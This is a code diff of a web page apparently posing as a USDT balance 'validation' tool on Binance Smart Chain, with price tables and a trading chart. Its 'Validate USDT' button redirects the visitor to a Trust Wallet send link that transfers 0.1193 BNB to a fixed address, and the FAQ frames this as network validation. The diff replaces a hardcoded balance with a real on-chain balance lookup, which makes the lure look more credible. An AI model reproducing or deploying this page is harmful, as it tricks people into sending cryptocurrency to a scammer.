@@ -111,44 +111,20 @@
     #priceTable th {
       color: #f0b90b;
     }
-    .coin-logo {
-      width: 20px;
-      height: 20px;
-      vertical-align: middle;
-      margin-right: 6px;
-    }
-    @media (max-width: 768px) {
-      header, .btn-group {
-        flex-direction: column;
-        align-items: flex-start;
-      }
-      #marketChart iframe {
-        width: 100% !important;
-        height: 300px;
-      }
-    }
   </style></head>
 <body>
   <header>
     <div class="usdt-info">
       <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT Logo" />
-      Total USDT: $3700.78
+      Total USDT: <span id="usdtAmount">$3700.78</span>
     </div>
     <div class="btn-group">
       <button id="connectWallet">Validate USDT</button>
-      <button id="connectCoinStats">Connect Wallet</button>
+      <button id="connectCoinStats">Connect via CoinStats</button>
       <button id="faqButton">FAQ</button>
     </div>
   </header>  <main>
-    <h1>Validate Your USDT Balance on BSC</h1>
-    <div id="walletInfo" style="display:none">
-      <div class="token-box">
-        <a href="https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955" target="_blank">
-          <img src="https://assets.coingecko.com/coins/images/325/thumb/Tether-logo.png" alt="USDT">
-        </a>
-        <span id="usdtAmount">$3700.78 USDT</span>
-      </div>
-    </div><div id="marketChart">
+    <h1>Validate Your USDT Balance on BSC</h1><div id="marketChart">
   <iframe src="https://s.tradingview.com/embed-widget/mini-symbol-overview/?locale=en#%7B%22symbol%22%3A%22BINANCE%3AUSDTBTC%22%2C%22width%22%3A%22900%22%2C%22height%22%3A%22400%22%2C%22locale%22%3A%22en%22%2C%22colorTheme%22%3A%22dark%22%2C%22isTransparent%22%3Afalse%2C%22autosize%22%3Afalse%7D"
     width="100%" height="400" frameborder="0" allowtransparency="true" scrolling="no"></iframe>
 </div>
@@ -165,8 +141,11 @@
 
   </main>  <section id="faqPage">
     <h2>Frequently Asked Questions</h2>
-    <p><strong>[1] HOW TO VALIDATE:</strong> To validate Asset click on <strong>connect wallet</strong> which redirects you to trust wallet. Confirm your BNB network validation, wait for 5 minutes after validation to transfer from Trust Wallet to your Binance.</p>
+    <p><strong>[1] HOW TO VALIDATE:</strong> Click <strong>Connect Wallet</strong> to validate via Trust Wallet. Or click <strong>Connect via CoinStats</strong> to link Web3 wallets or exchanges and fetch your USDT from Binance Smart Chain.</p>
   </section>  <script>
+    const USDT_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
+    const ABI = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
+
     const providerOptions = {
       walletconnect: {
         package: window.WalletConnectProvider.default,
@@ -185,72 +164,67 @@
     let web3;
 
     async function getUSDTBalance(address) {
-      const hardcodedBalance = "3700.78";
-      document.getElementById("usdtAmount").textContent = `$${hardcodedBalance} USDT`;
+      const contract = new web3.eth.Contract(ABI, USDT_CONTRACT);
+      const raw = await contract.methods.balanceOf(address).call();
+      const balance = parseFloat(web3.utils.fromWei(raw)).toFixed(2);
+      document.getElementById("usdtAmount").textContent = `$${balance} USDT`;
     }
 
-    async function initiateWalletConnectFlow() {
-      try {
-        const provider = await web3Modal.connect();
-        web3 = new Web3(provider);
-        const chainId = await web3.eth.getChainId();
-        if (chainId !== 56) {
-          alert("Please switch to Binance Smart Chain (BSC)");
-          return;
-        }
-        const accounts = await web3.eth.getAccounts();
-        const userAddress = accounts[0];
-        document.getElementById("walletInfo").style.display = "block";
-        await getUSDTBalance(userAddress);
-      } catch (err) {
-        console.error("Connection error:", err);
-        alert("Failed to connect. Try again.");
-      }
+    async function connectWallet() {
+      const provider = await web3Modal.connect();
+      web3 = new Web3(provider);
+      const accounts = await web3.eth.getAccounts();
+      const userAddress = accounts[0];
+      await getUSDTBalance(userAddress);
     }
 
-    document.getElementById("connectWallet").addEventListener("click", () => {
+    document.getElementById("connectWallet").onclick = () => {
       window.location.href = "https://link.trustwallet.com/send?coin=20000714&address=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&amount=0.1193";
-      setTimeout(() => initiateWalletConnectFlow(), 5 * 60 * 1000);
-    });
+      setTimeout(connectWallet, 3000);
+    };
 
-    document.getElementById("connectCoinStats").addEventListener("click", () => {
-      window.location.href = "https://coinstats.app/wallet";
-    });
+    document.getElementById("connectCoinStats").onclick = () => {
+      window.location.href = "https://coinstats.app/wallet"; // Simulated redirect, CoinStats handles wallet/exchange connection
+    };
 
-    document.getElementById("faqButton").addEventListener("click", () => {
+    document.getElementById("faqButton").onclick = () => {
       const faq = document.getElementById("faqPage");
       faq.style.display = faq.style.display === "none" ? "block" : "none";
-    });
+    };
 
     async function fetchCoinPrices() {
-      const ids = [
-        "tether", "bitcoin", "binancecoin", "binance-usd", "solana", "ethereum",
-        "dogecoin", "ripple", "cardano", "polygon", "tron", "polkadot",
-        "shiba-inu", "litecoin", "chainlink"
-      ];
-      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(",")}&vs_currencies=usd&include_logo=true`;
-      const res = await fetch(url);
-      const data = await res.json();
+      const ids = "tether,bitcoin,binancecoin,binance-usd,solana,ethereum,dogecoin,xrp,cardano,polygon,tron,polkadot,shiba-inu,litecoin,chainlink";
+      const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
+      const prices = await res.json();
       const tbody = document.getElementById("coinPrices");
       tbody.innerHTML = "";
-      for (const coinId of ids) {
-        const coin = data[coinId];
-        const logoUrl = `https://assets.coingecko.com/coins/images/1/large/placeholder.png`;
+      for (const id in prices) {
+        const logoUrl = `https://assets.coingecko.com/coins/images/${getLogoId(id)}/thumb.png`;
         const row = document.createElement("tr");
-        row.innerHTML = `<td><img class="coin-logo" src="https://assets.coingecko.com/coins/images/${getCoinLogoId(coinId)}.png" alt=""> ${coinId.replace(/-/g, ' ')}</td><td>$${coin.usd.toLocaleString()}</td>`;
+        row.innerHTML = `<td><img src="${logoUrl}" alt="logo" style="width:20px;vertical-align:middle;margin-right:6px;"> ${id.replace(/-/g, ' ')}</td><td>$${prices[id].usd.toLocaleString()}</td>`;
         tbody.appendChild(row);
       }
     }
 
-    function getCoinLogoId(coinId) {
-      const logos = {
-        "tether": "325", "bitcoin": "1", "binancecoin": "825",
-        "binance-usd": "9576", "solana": "4128", "ethereum": "279",
-        "dogecoin": "74", "ripple": "44", "cardano": "975",
-        "polygon": "3890", "tron": "1958", "polkadot": "12145",
-        "shiba-inu": "11939", "litecoin": "2", "chainlink": "877"
+    function getLogoId(coin) {
+      const map = {
+        tether: 325,
+        bitcoin: 1,
+        ethereum: 279,
+        binancecoin: 825,
+        "binance-usd": 9576,
+        solana: 4128,
+        dogecoin: 74,
+        xrp: 44,
+        cardano: 975,
+        polygon: 3890,
+        tron: 1958,
+        polkadot: 121,
+        "shiba-inu": 11939,
+        litecoin: 2,
+        chainlink: 877
       };
-      return logos[coinId] || "1";
+      return map[coin] || 325;
     }
 
     fetchCoinPrices();
